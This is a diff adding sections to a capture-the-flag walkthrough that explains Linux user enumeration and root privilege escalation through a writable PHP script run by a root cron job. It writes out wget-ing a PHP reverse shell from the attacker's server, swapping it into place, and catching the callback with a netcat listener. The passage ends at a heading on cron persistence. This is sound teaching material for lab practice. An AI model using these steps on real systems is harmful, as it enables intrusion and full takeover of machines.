@@ -139,3 +139,82 @@ python -c 'import pty;pty.spawn("/bin/bash");'
 
 Now we have a (slightly) more stable shell, it is time to get enumerating the box :detective: so we can find ways to elevate our privileges :arrow_up:
 
+## initial enumeration and grabbing the user flag
+
+We start our enumeration by looking for other users on the system - this is always a good idea. We are looking for regular users rather than service users so we can us `cat /etc/passwd | grep -v /nologin` to filter out users who have `/nologin` specified as their shells. We find one other regular user called *noulis* on the victim machine.
+
+![enum1](./images/15.png)
+
+When we take a look :eyes: at the home directory for *noulis* we (oddly) find that we can access it *and* read the user flag file with `cat user.txt` because other users (including us!) have *read* access to it.
+
+![enum2](./images/16.png)
+
+Well, that was nice :cake: 
+
+With that out of the way, we can turn our attention to elevating our privileges. There are endless ways to do this, but the name of the box (strongly) hints at a cron job being involved...
+
+## enumerating cron jobs
+
+First up, what is cron and why is it important for us as ~~hackers~~ penetration testers?
+
+> [!NOTE]
+> If you want to delve deeper into cron please check out [scheduling tasks on linux](https://github.com/zigzaga00/linux-notes/blob/main/linux-notes.md#automating-and-scheduling-tasks-using-cron-jobs)
+
+Simply put, cron lets us schedule repetitive tasks on linux systems. It is important to bear in mind that we can set up *user specific* cron jobs and *system wide* cron jobs.
+
+As ~~penetration testers~~ hackers looking for a way to elevate our privileges, we are interested in cron jobs which are running as the root user or other interesting users.
+
+One place we can look for these is in the `/etc/crontab` file - we can simply use `cat /etc/crontab` to look at its contents.
+
+This crontab is used to keep track of *system wide* cron jobs rather than *user specific* ones. We might find cron jobs running as more interesting users in this crontab and we might even find (as in this case) cron jobs set to run as root :smiley:
+
+![cron1](./images/17.png)
+
+The format of `etc/crontab` might seem confusing at first, but it is quite simple. Hopefully, the following table will aid understanding.
+
+|minute|hour|day|month|day of the week|user|command|
+|---|---|---|---|---|---|---|
+|*|*|*|*|*|root|command goes here|
+
+The `*` is a wildcard which specifies all. The minute is the minute past an hour, the hour is the hour of the day, the day is the date of the month, the month is the month of the year, the day of the week is a filter and is used to numerically specify a day of the week with 0 or 7 specifying Sunday, the user is the user the task will run as and the command can either be put directly into the crontab or it can reference a binary or shell script - phew :hot_face:
+
+In the case on this box, php is running a php script which can be found at `/var/www/laravel/artisan` every minute as the root user.
+
+Why should we care? :confused:
+
+Because it is running a php script as the *root* user. What if we have *write* access to the php script it is running? :thinking:
+
+## exploiting misconfigured permissions and a cron job
+
+When we check the permissions for `/var/www/laravel/artisan` we find that the `www-data` user has *write* access to it :facepalm: This means that we can now replace it with a malicious php script or append malicious php code to it.
+
+![cron2](./images/18.png)
+
+We can edit a php reverse shell on our attacking machine and then transfer it to the victim machine.
+
+![cron3](./images/20.png)
+
+To transfer the edited php reverse shell to the victim machine we can start a simple python http server on our attacking machine in the same directory as the php reverse shell and then get it using wget on the victim machine.
+
+```bash
+sudo python3 -m http.server 80
+
+wget http://10.10.14.15/rs.php
+```
+
+We now need to give the php reverse shell executable permissions using `chmod +x rs.php`
+
+![cron4](./images/21.png)
+
+If we care :angel: about restoring the system to how it was before we messed with it, now would be a good time to rename the original `/var/www/laravel/artisan` script to be something like `/var/www/laravel/artisan.bak` since we are just about to replace it with our malicious php script using `mv ./rs.php /var/www/laravel/artisan` :vampire:
+
+We now just need to open a new netcat listener on our attacking machine using the same port as we specified in the php reverse shell - in this case that is 4445 `sudo nc -nlvp 4445`
+
+We will (hopefully) soon get a reverse shell as root because the cron job we saw in `/etc/crontab` will execute the (now malicious) `/var/www/laravel/artisan` php script as the root user - this in turn will call back to our netcat listener on our attacking machine :thumbsup:
+
+![pwned](./images/23.png)
+
+At this point, the box has been pwned :skull: but we can continue our fun by looking at how we can use cron jobs to establish *persistance* on a compromised machine and a tool we can use to help us find *user specific* cron jobs - this can sometimes be necessary since the root user might have scheduled an exploitable cron job in a *user specific* way which will not show in `/etc/crontab`
+
+## persistant access via a cron job
+
